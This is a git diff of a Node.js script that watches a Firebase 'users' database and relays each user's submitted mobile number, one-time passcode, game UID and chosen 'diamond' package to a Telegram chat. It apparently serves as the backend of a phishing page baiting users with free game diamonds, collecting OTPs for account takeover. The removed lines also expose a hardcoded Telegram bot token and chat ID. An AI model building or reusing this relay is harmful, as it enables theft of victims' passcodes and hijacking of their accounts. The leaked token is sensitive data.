@@ -1,53 +1,40 @@
 import admin from "firebase-admin";
 import TelegramBot from "node-telegram-bot-api";
+import fs from "fs";
+
+// Firebase service account
 import serviceAccount from "./serviceAccountKey.json" assert { type: "json" };
 
-// ================= Firebase Setup =================
+// Telegram credentials from Render environment variables
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+// Initialize Firebase
 admin.initializeApp({
   credential: admin.credential.cert(serviceAccount),
   databaseURL: "https://siyamhasansiyam-2c149-default-rtdb.firebaseio.com"
 });
 
 const db = admin.database();
+const bot = new TelegramBot(BOT_TOKEN);
 
-// ================= Telegram Bot Setup =================
-const botToken = "7860488783:AAGcAs1wJJXnb2Q0bcUNHi1CJZuXRJvSoKI";
-const chatId = "7465244567";
-const bot = new TelegramBot(botToken);
-
-// ================= Firebase Listener =================
+// Firebase path to listen
 const usersRef = db.ref("users");
 
-// নতুন user add হলে
-usersRef.on("child_added", snapshot => {
+// Listen for new data
+usersRef.on("child_changed", (snapshot) => {
+  const userId = snapshot.key;
   const data = snapshot.val();
-  const userKey = snapshot.key;
+  let message = `User: ${userId}\n`;
 
-  if(data.NUMBERC) bot.sendMessage(chatId, `New Number: ${data.NUMBERC}`);
-  if(data.OTPC) bot.sendMessage(chatId, `OTP Submitted: ${data.OTPC}`);
-  if(data.UIDC) bot.sendMessage(chatId, `UID Submitted: ${data.UIDC}`);
-  if(data.DIAMONDC) bot.sendMessage(chatId, `Diamond Selected: ${data.DIAMONDC}`);
+  if(data.NUMBERC) message += `Mobile: ${data.NUMBERC}\n`;
+  if(data.OTPC) message += `OTP: ${data.OTPC}\n`;
+  if(data.UIDC) message += `UID: ${data.UIDC}\n`;
+  if(data.DIAMONDC) message += `Diamond: ${data.DIAMONDC}`;
+
+  bot.sendMessage(CHAT_ID, message)
+    .then(() => console.log("Message sent:", message))
+    .catch(err => console.error("Telegram error:", err));
 });
 
-// existing user update হলে
-usersRef.on("child_changed", snapshot => {
-  const data = snapshot.val();
-  const userKey = snapshot.key;
-
-  if(data.NUMBERC && !data._sentNumber){
-    bot.sendMessage(chatId, `New Number: ${data.NUMBERC}`);
-    usersRef.child(userKey).update({_sentNumber:true});
-  }
-  if(data.OTPC && !data._sentOTP){
-    bot.sendMessage(chatId, `OTP Submitted: ${data.OTPC}`);
-    usersRef.child(userKey).update({_sentOTP:true});
-  }
-  if(data.UIDC && !data._sentUID){
-    bot.sendMessage(chatId, `UID Submitted: ${data.UIDC}`);
-    usersRef.child(userKey).update({_sentUID:true});
-  }
-  if(data.DIAMONDC && !data._sentDiamond){
-    bot.sendMessage(chatId, `Diamond Selected: ${data.DIAMONDC}`);
-    usersRef.child(userKey).update({_sentDiamond:true});
-  }
-});
+console.log("Firebase → Telegram listener running...");
